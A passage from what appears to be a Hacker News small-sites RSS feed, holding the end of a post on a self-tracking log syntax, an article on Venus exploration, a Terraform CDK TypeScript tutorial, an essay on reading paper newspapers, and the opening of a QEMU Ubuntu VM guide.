<p>To do away with any confusion about capitalization, I decided to make everything case-insensitive:</p>

<p>
3: Uppercase characters equal their lowercase counterparts
</p>

<p>This way, I can write anything into the log that comes to my mind without thinking about syntax at all. As long as I stick to the characters A-Z and the space, I can log anything in any way I like.</p>

<p>Another early design decision about my self-tracking was that it is OK to write events into the log at any time. So I wrote all three log entries above at 09:00 in the morning, even the one about 18:41 of the last day. It is impossible to proactively track everything that could be of interest later. This is different to scientific studies where you would usually define upfront which causes to measure against which outcomes. But I think it is still useful to retroactively log data in the hopes that you can later make sense of it. That is how the human mind works. It's normal to think about past events when you try to find causes for the current situation. And I think a proper lifelong log can help us with this, even if we do not set up A/B tests - but we will, further down in this article.</p>

<p>As you can see, I also took the liberty to log observations about the past. "Slept with the window open." An acceptable alternative is to retroactively put the beginning of the event into the log, like I did with the pizza:</p>

<p>
2020-05-28 18:41 Eat Pizza<br>
2020-05-28 23:20 Go to bed with the window open<br>
2020-05-29 09:00 Headaches<br>
</p>

<p>The idea is to log a lot of data quickly when I feel like logging it. The data can be dirty. No problem - clean it up later. Keep it in Git to have a track record how it changed.</p>

<p>A nice convenience in Vim is that you can make it suggest the next word by pressing CTRL+N. This makes logging very fast. Instead of typing "Headache" you can just type H and CTRL+N and it will give you a list of every word with H you already have in your log. It also prevents typos and makes the data cleaner.</p>

<p>For even greater convenience, I added another rule to my syntax:</p>

<p>
4: _ equals space.
</p>

<p>This means that instead of writing "Slept with the window open" I can write "Slept_with_the_window_open". From a data perspective, the two are equivalent. But for typing, now all I have to do is type S-CTRL+N and I get the whole event suggested by Vim "Slept_with_the_window_open". Which makes typing this event a matter of three keystrokes and keeps the data clean as I will always write it the same way.</p>

<p>At this point, writing the events was already super fast. The most cumbersome part of logging was typing the date and time manually. So I added a shortcut to Vim:</p>

<p>
nnoremap &lt;space&gt;t o&lt;C-r&gt;=strftime("%F %H:%M ")&lt;cr&gt;
</p>

<p>Now all I have to do to add a log line is to hit space+t and I will be on a line that already has the date and time. So I can directly start typing the event that I want to log. Making a log entry now usually only takes about three seconds as the date/time is automatically inserted and the event is usually suggested too after I type the first few characters.</p>

<p>After dabbling with freeform log events for a while, I wanted multiple levels of an observation. So instead of</p>

<p>
2020-06-01 18:41 Meeting with Hugo Mayer
</p>

<p>I started writing:</p>

<p>
2020-06-01 17:00 Meeting: Hugo Mayer
</p>

<p>So the colon has a special meaning:</p>

<p>
5: A colon begins another level of the observation
</p>

<p>I use this for measurements all the time:</p>

<p>
2020-06-02 11:00 Temperature: 22°C<br>
2020-06-02 11:00 Humidity: 43%
</p>

<p>And also for subjective measurements:</p>

<p>
2020-06-02 12:15 Mood: Very Good<br>
2020-06-04 13:20 Sore eyes: Medium<br>
</p>

<p>There can be multiple colons in one line. For example, the following would log that I had sore eyes and felt it mostly in my left eye:</p>

<p>
2020-06-04 13:20 Sore eyes: Medium: Mostly Left
</p>

<h2>A/B Tests</h2>

<p>What about A/B tests? Maybe it is not the pizza that causes headaches the next day, but that eating pizza and having a headache the next day have the same root cause, like not eating enough for breakfast?</p>

<p>Here comes the question mark:</p>

<p>
2020-06-05 22:30 Eat: Pizza? Yes
</p>

<p>A question mark marks a coin flip. So if I say to myself, "I am hungry, but should I really eat pizza at this time?" then I write down the thing I am about to do and add a question mark. This means I will now have to do a coin flip and decide between Yes and No. Yes means the event left to the coin flip took place. No means it did not.</p>

<p>To make this easier, I added this shortcut to my bashrc:</p>

<p>
alias coindecide='if (( RANDOM % 2 == 0 )); then echo Yes; else echo No; fi'
</p>

<p>So now I can just type "coindecide&lt;enter&gt;" to get a decision by coin flip. And since bash has autocompletion, I usually just type "coi&lt;tab&gt;&lt;enter&gt;" and have my decision. Super fast.</p>

<p>I could have put a coindecide macro into Vim, of course. But it is a nice tool in many situations, not only when writing. So I added it to the shell instead.</p>

<h2>Additional information</h2>

<p>To be able to put more info into the log even in lines structured according to the aforementioned six rules, I use parenthesis:</p>

<p>
2020-07-08 12:30 Take a walk? Yes (60min)
</p>



<p>
7: Parenthesis can be used to add additional information
</p>

<h2>Order</h2>

<p>Since I want a human-friendly format, the time is only tracked by the minute. This means that the order of events that are happening within the same minute is defined by their order in the log.
This is important when using tools on the log to convert, filter, or merge it with other logs. Or when importing it into a database. Order always has to be preserved.</p>

<p>
8: Order is important
</p>

<p>So these are the eight rules I have been developing over the last five months of self-tracking:</p>

<p>
1: Every line starts with the date and time<br>
2: Everything until [^a-z ] describes an observation<br>
3: Uppercase characters equal their lowercase counterparts<br>
4: _ equals space<br>
5: A colon begins another level of the observation<br>
6: A question mark indicates a coin flip<br>
7: Parenthesis can be used to add more information<br>
8: Order is important<br>
</p>

<p>
 Discussions about this text are taking place on <a href="https://twitter.com/marekgibney/status/1307690563198750723" target="_blank">Twitter</a> and <a href="https://lobste.rs/s/ri5utx/syntax_for_self_tracking" target="_blank">Lobste.rs</a>
</p></div>


</div></div>]]>
            </description>
            <link>https://www.gibney.de/a_syntax_for_self-tracking</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534179</guid>
            <pubDate>Sun, 20 Sep 2020 14:16:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Web Assembly Playground]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534088">thread link</a>) | @lanecwagner
<br/>
September 20, 2020 | https://app.qvault.io/playground/python | <a href="https://web.archive.org/web/*/https://app.qvault.io/playground/python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://app.qvault.io/playground/python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534088</guid>
            <pubDate>Sun, 20 Sep 2020 14:00:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why explore Venus, besides finding life]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533926">thread link</a>) | @uncertainquark
<br/>
September 20, 2020 | https://jatan.space/why-explore-venus/ | <a href="https://web.archive.org/web/*/https://jatan.space/why-explore-venus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><figure><img loading="lazy" width="720" height="720" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/05/venus-visible-radar.jpg?resize=720%2C720&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/05/venus-visible-radar.jpg?w=720&amp;ssl=1 720w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/05/venus-visible-radar.jpg?resize=200%2C200&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/05/venus-visible-radar.jpg?resize=400%2C400&amp;ssl=1 400w" sizes="(max-width: 720px) 100vw, 720px" data-recalc-dims="1"><figcaption>Left – Venus as it would approximately look to the human eye, imaged by NASA’s Mariner 10 spacecraft (<a href="https://www.planetary.org/multimedia/space-images/venus/global-view-of-venus-from.html">full globe view</a>), Right – Radar image (false-color) of Venus’ surface taken by NASA’s Magellan orbiter (<a href="https://photojournal.jpl.nasa.gov/catalog/PIA00104">full globe view</a>).</figcaption></figure></div>



<h3>Why study Venus?</h3>



<p>The Sun rises in the east and sets in the west, except if you are on Venus. That’s because it rotates on its axis in the opposite direction from other planets, and nobody knows why. This is just one of the many mysteries of Venus, a cloud-shrouded hellscape with an atmosphere 50 times denser than Earth’s, and average surface temperatures of 470 degrees Celsius — hot enough to melt lead.</p>



<p>Venus is currently inhospitable, but it wasn’t always that way. Past missions there have observed <a href="https://www.semanticscholar.org/paper/Felsic-highland-crust-on-Venus-suggested-by-Galileo-Hashimoto-Roos-Serote/e251f805ea0cc28680788f0dc865acde415cda38">granite-like rocks</a> on the surface, which require abundant water to form. In the early solar system when the Sun was cooler, scientists think Venus may have had <a href="https://www.nasa.gov/feature/goddard/2016/nasa-climate-modeling-suggests-venus-may-have-been-habitable">liquid water on the surface for two billion years</a>—far longer than Mars, which may have had liquid water for <a href="https://www.planetary.org/blogs/guest-blogs/2019/mars-water-stable-paradox.html">300 million years</a>. Water is the key to life as we know it, so did Venus once have life?</p>



<div><figure><img loading="lazy" width="4096" height="4096" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?fit=1024%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?w=4096&amp;ssl=1 4096w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=2048%2C2048&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=1200%2C1200&amp;ssl=1 1200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?resize=400%2C400&amp;ssl=1 400w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?w=2400&amp;ssl=1 2400w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/ancient-venus-water-oceans.jpg?w=3600&amp;ssl=1 3600w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>This artist’s rendering shows what Venus might have looked like in the past, boasting a global ocean. <a href="https://www.nasa.gov/feature/goddard/2016/nasa-climate-modeling-suggests-venus-may-have-been-habitable">Credit: NASA</a></figcaption></figure></div>



<pre><strong>The hottest planet</strong>
Venus is the hottest planet in the solar system, even though Mercury is twice as close to the Sun and receives four times more solar energy. The reason? Mercury has no atmosphere, whereas Venus’ thick, carbon dioxide atmosphere creates a runaway greenhouse effect, trapping in heat. That’s also why unlike Mercury whose nightside can get as cold as -220 degrees Celsius, Venus continues to be equally hot even at night.</pre>



<p>How did Venus transform from a potentially habitable world to its current hellish state? Studying Venus helps scientists get answers to questions like that while simultaneously gaining insights into what makes Earth a haven for life. Scientists also use Venus as a reference to understand how Earth-sized planets around other stars evolve and what conditions might exist there. To that end, Venus also helps scientists model Earth’s climate, and serves as a cautionary tale on how dramatically a planet’s climate can change.</p>



<p>There is also a <a href="https://www.liebertpub.com/doi/10.1089/ast.2017.1783">slim chance microbial life currently exists</a> in Venus’s upper atmosphere, where mysterious dark patches absorb more than half the solar energy the planet receives. This region, approximately 50 kilometers above the surface, has Earth-like temperatures and pressures. In September 2020, scientists announced that Earth-based radio telescopes have <a href="https://ras.ac.uk/news-and-press/news/hints-life-venus">detected phosphine molecules</a> in this region, which could be a biosignature of microbial life. Venus is on average almost three times closer to Earth than Mars, often shining as a bright evening star in our skies. Have we been looking for life on the wrong planet?</p>



<h3>A brief history of Venus exploration</h3>



<p>Venus was the first planet to be visited by a spacecraft. In 1962, NASA’s Mariner 2 flew by the planet and discovered it was a hot world with no self-generated magnetic field. The Soviet Union became the world leader in early Venus exploration after that.</p>



<p>The Soviet Union sent the Venera 4, 5 and 6 spacecraft to explore Venus’ atmosphere in the same decade. As the probes descended, their instruments revealed the dense atmosphere to contain 96% carbon dioxide and atmospheric pressures to exceed Earth’s by 50 to 100 times, depending on the altitude.</p>



<p>The Soviet Union then went on to successfully land ten spacecraft on Venus from 1970 to 1985 – the Venera landers labelled 7 through 14 and Vega 1 &amp; 2. During their atmospheric descent, their instruments measured temperature and pressure profiles, elemental makeup of Venus’ clouds and their layering. After landing, these spacecraft lasted from a few tens of minutes to two hours at best under the harsh conditions. During that time, they took the first and the only images of Venus’ surface and also determined the chemical composition of nearby rocks. To this day, the Soviet Union remains the only nation to have landed spacecraft on the surface and transmitted both data and images back to Earth.</p>



<div><figure><img loading="lazy" width="960" height="481" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-venera-13.jpg?resize=960%2C481&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-venera-13.jpg?w=960&amp;ssl=1 960w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-venera-13.jpg?resize=200%2C100&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-venera-13.jpg?resize=768%2C385&amp;ssl=1 768w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"><figcaption>Composite views created from images of Venus’ surface taken by the Soviet Venera 13 Venus lander. Credit: Venera team/Don P. Mitchell.</figcaption></figure></div>



<p>Due to thick clouds, it is impossible to see Venus’ surface without radar. NASA’s Magellan orbiter, launched in 1990, used radar to map Venus’ surface at the highest resolution to date. Magellan revealed that all of the planet’s impact craters are formed <a href="https://www.semanticscholar.org/paper/VOLCANISM-AND-TECTONICS-ON-VENUS-Nimmo-Mckenzie/ca688453629b3971152c65443da14675fcbe3cf8">within the last 700 million years</a>. This implies that Venus’ surface was completely reshaped by a worldwide volcanic event in its recent geologic past—but <a href="https://www.planetary.org/blogs/guest-blogs/the-venus-controversy.html">exactly what happened is still up for debate</a>.</p>



<p>Magellan also found no sign of plate tectonics. On Earth, plate tectonics is a process in which sections of the planet’s outer crust glide over the mantle—the rocky inner layer above the core—allowing heat to escape through volcanism. Since we think Venus’s interior is similar to Earth’s, the lack of plate tectonics means that volcanoes on Venus must work differently than on Earth.</p>



<figure><img loading="lazy" width="1200" height="675" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?resize=1200%2C675&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?w=1249&amp;ssl=1 1249w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?resize=200%2C113&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/05/venus-surface-volcano-crater-magellan-radar.jpg?resize=1200%2C675&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px" data-recalc-dims="1"><figcaption>This 3D image of Venus’ surface was generated using radar data from NASA’s Magellan spacecraft. The 3-kilometer-tall volcano Gula Mons can be seen on the horizon, along with the 48-kilometer-wide Cunitz crater at near-center. <a href="https://photojournal.jpl.nasa.gov/catalog/PIA00233">Credit: NASA</a></figcaption></figure>



<p>The European Space Agency launched the Venus Express orbiter in 2006. By observing <a href="http://www.esa.int/Science_Exploration/Space_Science/Venus_Express/Hot_lava_flows_discovered_on_Venus">hotspots on the surface</a> and <a href="http://www.esa.int/Science_Exploration/Space_Science/Venus_Express/Have_Venusian_volcanoes_been_caught_in_the_act">changing sulfur dioxide levels</a> in the atmosphere over six years, the spacecraft collected the best evidence yet of active volcanism on Venus. Venus Express also discovered granite-like rocks across the planet that require abundant liquid water to form, solidifying the idea of the planet having past oceans.</p>



<p>Japan’s Akatsuki spacecraft is the only probe currently orbiting Venus. It <a href="https://www.bbc.com/news/science-environment-38638067">discovered a giant stationary wave</a> in Venus’ atmosphere that stretches across the planet, the largest of its kind in the solar system. Akatsuki continues to study Venus’s atmosphere in frequencies of light that human eyes cannot see, specifically ultraviolet, infrared, microwave and radio, so as to paint a complete picture of happenings on Venus.</p>



<h3>The road ahead</h3>



<p>Only three missions have visited Venus in the past 30 years, and many scientists feel <a href="https://www.planetary.org/blogs/guest-blogs/2020/the-next-10-years.html">new missions are long overdue</a>. The idea that Venus used to be at least as habitable as Mars and for a much longer period warrants further exploration and can have profound implications. Thanks to technological advancements in the last two decades, we can now unravel many of Venus’ mysteries.</p>



<p>Precise atmospheric measurements with a probe could test the hypothesis of microbial life in Venus’ upper atmosphere. Atmospheric probes would also analyze the extent that water may have existed on the surface, what the planet’s atmosphere was like, and how it changed into its present-day state. A spacecraft with a higher-resolution radar could help us solve the mystery of how Venus’s surface changed within the last billion years.</p>



<p>India aims to launch a Venus orbiter called Shukrayaan in 2023 equipped with a radar and infrared camera to map the surface. The spacecraft has a total of 12 instruments, and India’s space agency ISRO has <a href="https://www.isro.gov.in/sites/default/files/ao_venus.pdf">called for instrument proposals</a> in which scientists from international space agencies, including NASA, are expected to participate.</p>



<p>In February 2020 <a href="https://www.nasa.gov/press-release/nasa-selects-four-possible-missions-to-study-the-secrets-of-the-solar-system">NASA announced the selection of 4 mission concepts</a> that are under consideration to fly as part of the agency’s low-cost Discovery program. Two of these are Venus missions, DAVINCI+ and VERITAS.</p>



<p>DAVINCI+ consists of an orbiter and an atmospheric descent probe. The probe would make high precision measurements of trace gases in Venus’ atmosphere, helping firmly determine how much water Venus’ oceans had and how long they existed.</p>



<p>VERITAS will orbit Venus with a state-of-the-art radar and map the entire planet up to 100 times higher resolution than Magellan. This would give scientists a better handle on Venus’ geology and evolution and also reveal why the planet lacks large-scale plate tectonics.</p>



<p>Scientists hope that results from all these future orbiters will pave the way for renewed surface exploration of Venus, including roving platforms built specifically to endure the harsh environment.</p>



<hr>



<p><em>Originally published at <a href="https://www.planetary.org/explore/space-topics/venus/venus.html">The Planetary Society</a>.</em></p>

</div></div>]]>
            </description>
            <link>https://jatan.space/why-explore-venus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533926</guid>
            <pubDate>Sun, 20 Sep 2020 13:31:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Terraform Stacks with TypeScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533905">thread link</a>) | @juliankrispel
<br/>
September 20, 2020 | https://jkrsp.com/writing-terraform-with-typescript/ | <a href="https://web.archive.org/web/*/https://jkrsp.com/writing-terraform-with-typescript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>You may or may not have heard about the release of the <a href="https://github.com/hashicorp/terraform-cdk">terraform cdk</a> (short for cloud development kit). It’s HashiCorps answer to the aws cdk. In the words of the projects readme:</p>
<blockquote>
<p>CDK (Cloud Development Kit) for Terraform allows developers to use familiar programming languages to define cloud infrastructure and provision it through HashiCorp Terraform.</p>
</blockquote>
<p>Let’s try this out shall we?</p>
<p>To get the full developer experience, make sure you have <a href="https://github.com/Microsoft/TypeScript/wiki/TypeScript-Editor-Support">typescript support installed for your IDE</a></p>
<p><span>
      <a href="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/00172/cover.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="autocomplete-terraform" title="autocomplete-terraform" src="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/fcda8/cover.png" srcset="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/12f09/cover.png 148w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/e4a3f/cover.png 295w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/fcda8/cover.png 590w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/efc66/cover.png 885w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/00172/cover.png 1044w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h3>Generating the boilerplate</h3>
<p>Let’s open our terminal and install install cdktf-cli:</p>

<p>Next we’ll initialize the project</p>
<div data-language="bash"><pre><code><span>mkdir</span> hello-cdktf
<span>cd</span> hello-cdktf
cdktf init --template<span>=</span><span>"typescript"</span> --local</code></pre></div>
<p>Answer the two configuration questions and the project boilerplate will be generated.</p>
<p>Now we should see a <code>main.ts</code> file with the following contents in our folder:</p>
<div data-language="ts"><pre><code><span>import</span> <span>{</span> Construct <span>}</span> <span>from</span> <span>'constructs'</span><span>;</span>
<span>import</span> <span>{</span> App<span>,</span> TerraformStack <span>}</span> <span>from</span> <span>'cdktf'</span><span>;</span>

<span>class</span> <span>MyStack</span> <span>extends</span> <span>TerraformStack</span> <span>{</span>
  <span>constructor</span><span>(</span>scope<span>:</span> Construct<span>,</span> name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>scope<span>,</span> name<span>)</span><span>;</span>

    

  <span>}</span>
<span>}</span>

<span>const</span> app <span>=</span> <span>new</span> <span>App</span><span>(</span><span>)</span><span>;</span>
<span>new</span> <span>MyStack</span><span>(</span>app<span>,</span> <span>'hello-cdktf2'</span><span>)</span><span>;</span>
app<span>.</span><span>synth</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<h3>Adding a provider package and importing modules from it</h3>
<p>After generation finishes you’ll see a message in the console listing instructions of what to do next. To add the prebuilt aws provider (which also gives us all the modules and types that we might want).</p>
<div data-language="bash"><pre><code><span>npm</span> <span>install</span> -a @cdktf/provider-aws</code></pre></div>
<p>Now you can import modules from <code>@cdktf/provider-aws</code> such as <code>AwsProvider</code> and others. We’ll go for the <code>AwsProvider</code>, <code>LambdaFunction</code> and <code>IamRole</code>. Add this at the top of your file:</p>
<div data-language="ts"><pre><code><span>import</span> <span>{</span> AwsProvider<span>,</span> LambdaFunction<span>,</span> IamRole <span>}</span> <span>from</span> <span>'@cdktf/provider-aws'</span><span>;</span></code></pre></div>
<p>and then create an AwsProvider in your stack:</p>
<div data-language="ts"><pre><code><span>new</span> <span>AwsProvider</span><span>(</span><span>this</span><span>,</span> <span>'aws'</span><span>,</span> <span>{</span>
  region<span>:</span> <span>'eu-west-2'</span>
<span>}</span><span>)</span></code></pre></div>
<h3>Adding a lambda function to our stack</h3>
<p>To create a lambda we need to define an IAM role at first. Boring, but made easier by autocomplete of cours. Anyway here’s the default policy:</p>
<div data-language="ts"><pre><code><span>const</span> roleForLambda <span>=</span> <span>new</span> <span>IamRole</span><span>(</span><span>this</span><span>,</span> <span>'iam-role-for-lambda'</span><span>,</span> <span>{</span>
  name<span>:</span> <span>'iam-role-for-lambda'</span><span>,</span>
  assumeRolePolicy<span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
    <span>"Version"</span><span>:</span> <span>"2012-10-17"</span><span>,</span>
    <span>"Statement"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"Action"</span><span>:</span> <span>"sts:AssumeRole"</span><span>,</span>
        <span>"Principal"</span><span>:</span> <span>{</span>
          <span>"Service"</span><span>:</span> <span>"lambda.amazonaws.com"</span>
        <span>}</span><span>,</span>
        <span>"Effect"</span><span>:</span> <span>"Allow"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span></code></pre></div>
<p>Now we can add a lambda function to the stack like this:</p>
<div data-language="typescript"><pre><code><span>new</span> <span>LambdaFunction</span><span>(</span><span>this</span><span>,</span> <span>'hello-world'</span><span>,</span> <span>{</span>
  filename<span>:</span> process<span>.</span><span>cwd</span><span>(</span><span>)</span> <span>+</span> <span>'hello-world.zip'</span>
  functionName<span>:</span> <span>'hello-world'</span><span>,</span>
  handler<span>:</span> <span>'index.handler'</span><span>,</span>
  runtime<span>:</span> <span>'nodejs12.x'</span><span>,</span>
  role<span>:</span> roleForLambda<span>.</span>arn<span>,</span>
<span>}</span><span>)</span></code></pre></div>
<p>You will need to zip your lambda function - which is usually a separate step before running terraform. For example sake, let’s say you have a file in your project named <code>hello-world.js</code>:</p>
<div data-language="js"><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>async</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span> hello<span>:</span> world <span>}</span>
<span>}</span></code></pre></div>
<p>Then zip your lambda <code>zip -r lambda.zip hello-world.js</code></p>
<h3>Deploying your stack</h3>
<p>Before you deploy don’t forget need to <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html">have your aws credentials in your path</a>.</p>
<p>Now that you have everything ready you can deploy your stack with <code>cdktf deploy</code>. This command will display an execution plan and ask you if you want to deploy. Press the <code>Y</code> and <code>Enter</code> key to deploy.</p>
<p>Any errors at this stage should be farely self-explanatory. If they don’t make sense, google the error message - other people have likely run into the same problem.</p>
<hr>
<p>If you’re a terraform user and you’ve used the <code>lambda_function</code> module before, you’ll notice that the configuration is exactly the same.</p>
<p>Ultimately, when you run <code>cdktf synth</code> cdktf compiles your javascript/typescript modules into terraforms alternative <a href="https://www.terraform.io/docs/configuration/syntax-json.html"><code>JSON</code> configuration syntax</a>.</p>
<p>This is an extremely powerful feature of terraform’s design since it can be a compile target not just for javascript and typescript, but any kind of language. The open source community could add it’s own language compilers.</p>
<p>Why not write one in rust? 😅</p></section></div>]]>
            </description>
            <link>https://jkrsp.com/writing-terraform-with-typescript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533905</guid>
            <pubDate>Sun, 20 Sep 2020 13:28:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Read the Paper: Don't Be a Victim of Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533774">thread link</a>) | @robmay
<br/>
September 20, 2020 | http://coconutheadsets.com/2020/09/read-the-paper-dont-be-a-victim-of-algorithms/ | <a href="https://web.archive.org/web/*/http://coconutheadsets.com/2020/09/read-the-paper-dont-be-a-victim-of-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-63">
		
	
	<div>
		
<p>There are a few lessons I’ve learned in life.  The first was about reading hard things.  I started my career as an ASIC/FPGA designer, and I often designed chips that had to connect to other integrated circuits.  These ICs often had specification documents that described how they worked that were over 100 pages long.  I found it difficult to read through them, and I could rarely find what I was looking for, so I frequently asked colleagues questions about those ICs.  They would get frustrated and point to page 70 where I could find the answer.  And so I realized that I needed to suck it up and learn to read these dense technical specs.</p>



<p>The surprising thing that came from that is after a year of doing it, it became much easier.  The specs started to feel “normal” and easy to read.  They made sense and didn’t seem as dense as they did when I started.  I even became more willing than most people to read the dense specification documents, and thus became a valuable resource to my team as everyone knew if they had a question I had read the spec.</p>



<p>I’ve maintained this view since then that occasionally struggling through dense writings is valuable, and does something to your brain that shallow writing doesn’t do.</p>



<p>That is part of the reason I never gave up on the paper.  I’ve been a regular paper Wall Street Journal subscriber since 1996, when I was in college.  And today I also get the paper New York Times, and a handful of tech and business paper magazines.  The reason I stuck with paper is because I realized in the early days of the internet that the dense stuff rarely gets popular online, and online algorithms, even the early ones that were mostly just crowd sourced, focused more on linkbaity kinds of content.  If I wanted meatier information, I had to stick with paper.</p>



<p>But over time I realized something – that by sticking with the paper version of these things, I get a more balanced view.  Why?  Because when an editor has to choose what goes into a paper that is going to be distributed to thousands of different people, and the format is unchangeable, it can’t be highly personalized, and they can’t put in much linkbait.  The very fact that the paper has to go to a whole neighborhood insures it will have more even-keeled content than online algorithms.</p>



<p>I know.  I know.  It’s terrible that editors are gatekeepers and are in control of what you see if you read the paper.  They suppress things sometimes.  I understand that.  But, it’s naive to think any other systems are better.  Reddit or Hacker News?  The crowd is the gatekeeper.  Google or Flipboard?  The algorithm is the gatekeeper.  There is too much content in the world, so in every scenario there is a gatekeeper, and those gatekeepers are <a href="https://thewalrus.ca/how-algorithms-are-changing-what-we-read-online/#.X2OcIcqBphQ.twitter">changing what we read</a>.  Once you accept that fact, you ask yourself a different question – what are the incentives of that gatekeeper?  And I believe a human editor is the gatekeeper that has the strongest incentives to stay the most balanced.  </p>



<p>One way to be less of a victim of the online algorithms or crowd based information cascades is to read the physical paper.  It is more difficult for a medium to control what you think when it can’t hyper-personalize the information to your specific needs and wants.  And that’s a good thing.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-63 -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://coconutheadsets.com/2020/09/read-the-paper-dont-be-a-victim-of-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533774</guid>
            <pubDate>Sun, 20 Sep 2020 13:03:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using QEMU to Create a Ubuntu 20.04 Desktop VM on macOS]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24533742">thread link</a>) | @arthurk
<br/>
September 20, 2020 | https://www.arthurkoziel.com/qemu-ubuntu-20-04/ | <a href="https://web.archive.org/web/*/https://www.arthurkoziel.com/qemu-ubuntu-20-04/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <time datetime="2020-09-20">September 20, 2020</time>
<p>In this blog post we’re going to create a Ubuntu 20.04 VM using <a href="https://www.qemu.org/">QEMU</a> on MacOS.</p>
<p><img src="https://www.arthurkoziel.com/qemu-ubuntu-20-04/ubuntu-20-04-with-qemu.png" alt="A picture of the Ubuntu 20.04 Desktop"></p>
